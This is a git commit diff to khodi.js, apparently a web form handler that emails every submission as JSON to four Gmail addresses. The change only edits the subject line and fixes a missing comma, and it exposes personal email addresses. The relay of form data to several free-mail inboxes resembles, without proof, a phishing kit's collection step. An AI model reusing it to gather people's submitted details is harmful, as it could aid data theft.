158c785daa7890a24118aaaf0c67469616e650dd
zm9807350 <zm9807350@gmail.com>
2026-06-29 10:32:11 +0500

    Update khodi.js

--- khodi.js
+++ khodi.js
@@ -38,7 +38,7 @@ export default async function handler(req, res) {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
       to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,raheelnizamani503@gmail.com",
-      subject: "Gdh"
+      subject: "khodi",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
